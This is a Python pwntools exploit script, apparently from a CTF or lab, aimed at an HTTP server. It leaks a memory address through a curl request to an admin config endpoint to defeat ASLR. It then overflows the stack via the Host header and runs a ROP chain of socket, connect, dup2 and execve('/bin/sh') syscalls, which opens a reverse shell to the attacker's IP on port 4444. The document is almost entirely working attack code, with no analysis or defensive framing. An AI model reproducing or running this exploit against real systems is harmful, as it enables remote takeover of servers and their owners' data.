#!/usr/bin/env python3
from pwn import *
from pwnlib.rop.ret2csu import p64
import re
import subprocess
import json


context.arch = "amd64"
context.log_level = "INFO"

#p = remote("172.16.200.14", 80)
p = remote(args.IP, int(args.PORT))

# Hack-ily steal the hex IP address and Port
shellcode = shellcraft.connect(args.MY_IP, 4444)
packed_socket_adress = p64(int(shellcode.split('^')[1].split(' ')[1].strip("\n").strip("-"), 16))
hex_ip_and_port= hex(int(shellcode.split('^')[1].split(' ')[1].strip("\n").strip("-"), 16))
log.info(f"Hex IP: {hex_ip_and_port[0:9]} | Hex Port: {hex_ip_and_port[9:16]}")

# cURL ASLR Leak
curl_command = ['curl', '-d', '{"dashboard": "get"}', '-H', 'Content-Type: application/json', f'http://{args.IP}/!admin/config']
result = subprocess.run(curl_command, capture_output=True, text=True)
print(result.stdout)
leak = int(json.loads(result.stdout)["Host OS"].split(" ")[-1], 10)
if leak < 0:                    # Convert to unsigned
    leak = leak + 2**32

# Compute Leaks
base_guess = leak + 0x1C0 + 0x20#- 0x1D0F4
base_addr = ((base_guess // 0x1000) * 0x1000) + 0x1C000
binsh_guess = base_guess
ipaddr_guess = base_guess - 0x8

# Print Leaks for Debugging
log.info(f"Leak Decimal: {leak}")
log.info(f"Leak Big Hex: {hex(leak)}")
log.info(f"rop two Base: {hex(base_guess)}")
log.info(f"Da 1 /bin/sh: {hex(base_guess - 0x8)}")
log.info(f"revse ipaddr: {hex(base_guess - 0x10)}")

# Gadget Collection
pop_rax = 0x40ecd2
pop_rsi = 0x4128bd
pop_rdx = 0x4b4d1b
syscall = 0x44ea34
pop_rdi = 0x401b22

# Stack Address of ROP Chain
rop_addr = base_guess

# Build ROPChain
ropchain = b''
# ROP BREAKPOINT: 0x000000000040d8eb

# Socket syscall #
ropchain += p64(pop_rdi)        # domain = AF_INET = 0
ropchain += p64(0x2)
ropchain += p64(pop_rax)        # socket syscall
ropchain += p64(0x29)
ropchain += p64(pop_rsi)        # type = SOCK_STREAM = 1
ropchain += p64(0x1)
ropchain += p64(pop_rdx)        # protocol = IPPROTO_IP = 0
ropchain += p64(0x0)
ropchain += p64(0xbeefbeef)     # populate rbx
ropchain += p64(syscall)        # open our socket
log.info("Finished socket syscall")

# Connect syscall #
ropchain += p64(pop_rdi)        # put socket in RDI
ropchain += p64(0x3)            # hardcoded socket num
ropchain += p64(pop_rsi)        # movabs rax, 0x201010101010101/push rax/movabs rax, 0x301017e5d100103/xor
ropchain += p64(ipaddr_guess)   # This value needs to be an address (passed in before rop chain to prevent parsing)
ropchain += p64(pop_rax)        # syscall
ropchain += p64(0x2a)
ropchain += p64(pop_rdx)        # ????
ropchain += p64(0x10)
ropchain += p64(0xbeef2bab)     # Populate rbx
ropchain += p64(syscall)
log.info("Finished connect syscall")

# dup2 loop (put shell io to socket) #
ropchain += p64(pop_rdi)
ropchain += p64(0x3)            # Pass along socket

ropchain += p64(pop_rax)        # Reset syscall
ropchain += p64(0x21)
ropchain += p64(pop_rsi)        # Next buffer
ropchain += p64(0x2)
ropchain += p64(syscall)

ropchain += p64(pop_rax)        # Reset syscall
ropchain += p64(0x21)
ropchain += p64(pop_rsi)        # Next buffer
ropchain += p64(0x1)
ropchain += p64(syscall)

ropchain += p64(pop_rax)        # Reset syscall
ropchain += p64(0x21)
ropchain += p64(pop_rsi)        # Next buffer
ropchain += p64(0x0)
ropchain += p64(syscall)
log.info("Finished dup2 syscall")

# execve syscall #
ropchain += p64(pop_rdi)        # Prep binsh
ropchain += p64(rop_addr)       # Pointer to /bin/sh
ropchain += p64(pop_rsi)        # Null RSI
ropchain += p64(0x0)
ropchain += p64(pop_rdx)        # Null RDX
ropchain += p64(0x0)
ropchain += p64(0xbeef2bab)     # populate rbx
ropchain += p64(pop_rax)        # execve syscall
ropchain += p64(0x3b)               
ropchain += p64(syscall)
log.info("Finished execve syscall")

# Use leave gadget to cause RBP to take over stack and point to ropchain
chain = cyclic(336) + rop_addr.to_bytes(6, "little") + b'\x00\x00'

# Build request, add in our two addesses to the unparsed "Accept" field
# The first p64() is the ip address for listen()
post = b"POST / HTTP/1.1\r\nHost:  " + chain + b"\r\n\
    If-Modified-Since:\r\n\
    Accept: " + packed_socket_adress + b"/bin/sh\0" + ropchain + b"\r\n\
    AB=C\r\n\r\n"

log.debug(f"OVERFLOW: {chain}")
log.debug(f"POST: {post}")
log.debug(f"Chain Len: {len(chain)}")
log.debug(f"Post len: {len(post)}")
log.info(f"POST sent!")

# Send post and get shell
p.sendline(post)
p.interactive()